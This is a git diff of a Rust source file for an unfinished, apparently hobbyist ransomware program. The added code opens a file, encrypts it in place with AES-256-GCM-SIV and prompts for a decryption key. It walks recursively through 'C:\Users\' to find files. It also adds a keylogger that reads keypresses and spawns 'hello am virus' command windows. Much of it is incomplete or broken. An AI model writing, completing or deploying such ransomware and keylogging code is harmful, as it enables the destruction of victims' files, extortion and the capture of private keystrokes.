@@ -1,22 +1,34 @@
+#![allow(warnings)]
+#[allow(dead_code)]
+use aes_gcm_siv::aead::generic_array::GenericArray;
+use aes_gcm_siv::aead::Aead;
 use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
-use rand_chacha::rand_core::{SeedableRng, RngCore};
+use crossterm::event::{poll, read, Event, KeyCode};
+use crossterm::terminal::enable_raw_mode;
+use dioxus::prelude::*;
+use dioxus_desktop;
+use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
 use std::fs::File;
+use std::io::{Read, Write};
 use std::process::Command;
 use std::{io, path::Path};
-use walkdir::{DirEntry, Error, WalkDir}; //TODO: check the speed of this later
-                                         //TODO: gonna need to add more later,
-                                         // use aes-gcm-siv::{Aes256GcmSiv, aead::{Aead, KeyInit, Nonce}};
-                                         // FOR EDUCATIONAL PURPOSES ONLY
-                                         // build this for linux first and add windows stuff later??? might have time
-                                         // name: gentleman_green
+use walkdir::{DirEntry, Error, WalkDir};
+//TODO: check the speed of this later
+//TODO: gonna need to add more later,
 
 fn main() {
-    //create a popup on linux systems
-    check_requirements();
-    find_files();
-    //recursively find and encrypt all files
-    display_message();
+    // create a popup on windows systems
+
+    for n in 1..3 {
+        // TODO: delete this testing code later
+        let cmd = Command::new("cmd")
+            .arg("/C")
+            .arg("start cmd /K echo hello am virus")
+            .spawn()
+            .expect("ruh roh");
+    }
+    // test_encryptfile();
 }
 
 /**
@@ -49,22 +61,88 @@ fn display_message() {
 }
 
 /**
+ * This is a test function to make sure the encryption is working
+ *
+ * only encrypts the files on the desktop. used for testing so i dont break anything accidentally
+ */
+fn test_encryptfile() {
+    //the file in the windows vm is called restored
+    let mut testfile = File::open("restored").expect("can't open file o no");
+    let mut buffer = Vec::new();
+    testfile
+        .read_to_end(&mut buffer)
+        .expect("can't load file contents");
+
+    //call the generate key function
+    let mut rng = ChaCha20Rng::from_entropy();
+    let mut nonce_array = [0u8; 12];
+    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
+    let nonce = Nonce::from_slice(&nonce_array);
+
+    //FIXME: up to here. making the nonce
+    let key = Aes256GcmSiv::generate_key(rng);
+    let cipher = Aes256GcmSiv::new(&key);
+
+    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
+    //put the ciphertext back in the file
+
+    testfile.set_len(0);
+    testfile.write_all(&ciphertext.unwrap().as_slice()); //tvector -> slice
+                                                         //why this no work tho
+
+    //print the key and nonce TODO: check if :? is alg or display
+    println!("key: {:?}", key);
+
+    //TODO: !!!!! read the contents of the file!
+    //this will be in the completed code but not in this test function because im lazy
+
+    loop {
+        //delay and wait for user to enter the decryption key
+        //TODO: print the key needed for decryption
+        let mut user_input = String::new();
+        println!("Enter decryption key pls: ");
+        io::stdin().read_line(&mut user_input).unwrap();
+        let user_input_bytes = user_input.as_bytes(); //convert to bytes
+
+        //TODO: UP TO HERE TODAY
+        //key length 32, nonce length 12
+        if user_input_bytes.len() != 32 {
+            //print error
+            println!("Invalid key length")
+        } else {
+            // //FIXME: convert byte array into key format why this no work
+            // //WHY THIS NO WORK
+            // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
+            // //decrypt using the key
+            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
+        }
+        //convert to key
+    }
+    //TODO: put user input into the correct variable type
+    //try decrypting with this key, print if it works or not
+}
+
+/**
  * TODO: the initialization code for the cipher is here atm
  * idk if ill move it later
  *
  * Use AES-256
- * 
+ *
+ * Same key for all files, different nonce for each file
+ *
  * Notes: nonce is to make sure 2 identical plaintexts produce different output
  * counter is to make sure 2 identical blocks within the same plaintext produce different output
  */
 fn generate_key() {
+    //FIXME: change this later so the cipher + key is initialised once for all files.
+    //right now this is being use for only one file so its all in one function
     //TODO: have this return the key
     let rng = ChaCha20Rng::from_entropy();
     let mut nonce_array = [0u8; 12];
-    rng.fill_bytes(dest)//FIXME: up to here
+    // rng.fill_bytes(dest)//FIXME: up to here
     let key = Aes256GcmSiv::generate_key(rng);
     let cipher = Aes256GcmSiv::new(&key);
-    //FIXME: understand references in rust
+    //TODO: generate a nonce
 }
 
 /**
@@ -73,13 +151,13 @@ fn generate_key() {
  *
  * TODO: does this return anythign?
  */
-fn find_files() -> Result<(), Error> {
+fn traverse() -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
 
     //TODO: generate key here. one key to rule them all
 
-    for entry in WalkDir::new("/").follow_links(true) {
+    for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
         let entry: DirEntry = entry?;
         //iterate through all the files babey
         println!("found file: {}", entry.path().display());
@@ -99,10 +177,40 @@ fn decrypt() {
     //
 }
 
-fn keylogger() { //killswitch if user types please
-                 //
+fn keylogger() {
+    //killswitch if user types please
+    //
+    // let cmd = Command::new("cmd.exe")
+    //     .arg("/K")
+    //     .arg("echo keylogger started \n")
+    //     .spawn()
+    //     .expect("failed to start keylogger");
+    enable_raw_mode();
+    println!("weewoo");
+
+    loop {
+        //match case for different keys pressed
+
+        match read().unwrap() {
+            //read any event
+            Event::Key(event) => match event.code {
+                KeyCode::Char(character) => {
+                    println!("pressed: {}", character);
+
+                    // let cmd = Command::new("cmd.exe")
+                    //     .arg("/K")
+                    //     .arg(format!("print {} \n", character))
+                    //     .spawn()
+                    //     .expect("failed to start keylogger");
+                }
+                _ => {}
+            },
+            _ => {}
+        }
+    }
 }
 
+//TODO: is this even necessary with windows?
 fn root_check() { //
                   //if we dont have root. give popup: "may i plz have root 🥺👉🏽👈🏽"
 }
